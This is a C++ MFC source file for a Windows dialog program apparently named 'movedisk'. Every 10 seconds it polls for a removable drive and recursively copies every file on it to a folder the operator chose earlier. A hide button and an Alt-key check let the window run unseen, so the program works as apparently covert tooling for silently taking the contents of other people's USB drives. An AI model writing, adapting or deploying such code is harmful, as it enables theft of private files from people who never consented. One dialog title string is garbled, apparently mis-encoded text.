// movediskDlg.cpp : implementation file
//

#include "stdafx.h"
#include "movedisk.h"
#include "movediskDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMovediskDlg dialog

CMovediskDlg::CMovediskDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMovediskDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMovediskDlg)
	m_path = _T("");
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMovediskDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMovediskDlg)
	DDX_Text(pDX, IDC_EDIT1, m_path);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMovediskDlg, CDialog)
	//{{AFX_MSG_MAP(CMovediskDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_BUTTON2, Onstrat)
	ON_BN_CLICKED(IDC_BUTTON1, Onliulan)
	ON_BN_CLICKED(IDC_BUTTON4, OnHIDE)
	ON_BN_CLICKED(IDC_BUTTON5, OnButton5)
	ON_BN_CLICKED(IDC_BUTTON3, OnButton3)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMovediskDlg message handlers

BOOL CMovediskDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	setstrat=FALSE;
	  GetDlgItem(IDC_BUTTON3)->EnableWindow(FALSE);
	  GetDlgItem(IDC_BUTTON2)->EnableWindow(FALSE);
	SetTimer(0,1000*10,0);
	ait=FALSE;
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CMovediskDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMovediskDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMovediskDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CMovediskDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	CString string;

	
	if(setstrat)
	{
		string=finddsk();

		if(!string.IsEmpty())
		{
         filecopy(string.GetBuffer(0));
		}
	}

   if(GetAsyncKeyState(18))
	   //AIT
   {
	 ShowWindow(SW_SHOW);
   }





	CDialog::OnTimer(nIDEvent);
}

CString CMovediskDlg::finddsk()
{
	CString disk;
	UINT type;
	for(char i='c';i<='z';i++)
	{
     disk.Format("%c:",i);
     type=GetDriveType(disk.GetBuffer(0));
	 if(type==DRIVE_REMOVABLE)
	 {
        return disk;
	 }
	}
    return disk="";
}

void CMovediskDlg::filecopy(CString str)
{
	CFileFind file;
    CString strt;
    strt.Format("%s\\*.*",str);
    BOOL IsFinded=(BOOL)file.FindFile(strt);
    while(IsFinded)
    {
      IsFinded=(BOOL)file.FindNextFile();
      if(!file.IsDots())
      {
         CString foundFileName;
         foundFileName=file.GetFileName();
		 
         if(file.IsDirectory())
         {
            CString tempDir;
            tempDir.Format("%s\\%s",str,foundFileName);
            filecopy(tempDir);
         }
         else
         {
            CString tempFileName1,tempFileName2;
            tempFileName1.Format("%s\\%s",str,foundFileName);
			tempFileName2.Format("%s\\%s",m_path,foundFileName);
            ::CopyFile(tempFileName1,tempFileName2,FALSE);
         }
      }
    }
    file.Close();
}



int selectpath(char path[MAX_PATH])
{
   BROWSEINFO bi;
   bi.hwndOwner=NULL;
   bi.pidlRoot=NULL;
   bi.pszDisplayName=path;
   bi.lpszTitle="ÇëÑ¡ÔñÂ·¾¶";
   bi.ulFlags=BIF_EDITBOX;
   bi.lpfn=NULL;
   bi.lParam=0;
   bi.iImage=0;
   ITEMIDLIST  *pidl;
   pidl=SHBrowseForFolder(&bi);
   return(pidl && SHGetPathFromIDList(pidl,path));
}






void CMovediskDlg::Onstrat() 
{
	// TODO: Add your control notification handler code here
  setstrat=TRUE;
  GetDlgItem(IDC_BUTTON2)->EnableWindow(FALSE);
  GetDlgItem(IDC_BUTTON3)->EnableWindow(TRUE);

}


void CMovediskDlg::Onliulan() 
{
	// TODO: Add your control notification handler code here
  char buf[MAX_PATH];
  selectpath(buf);
  m_path=buf;
  GetDlgItem(IDC_BUTTON2)->EnableWindow(TRUE);
  UpdateData(FALSE);

}

void CMovediskDlg::OnHIDE() 
{
	// TODO: Add your control notification handler code here
	ShowWindow(SW_HIDE);
}

void CMovediskDlg::OnButton5() 
{
	// TODO: Add your control notification handler code here
OnOK();
}

void CMovediskDlg::OnButton3() 
{
	// TODO: Add your control notification handler code here
	setstrat=FALSE;
  GetDlgItem(IDC_BUTTON2)->EnableWindow(TRUE);
  GetDlgItem(IDC_BUTTON3)->EnableWindow(FALSE);
}
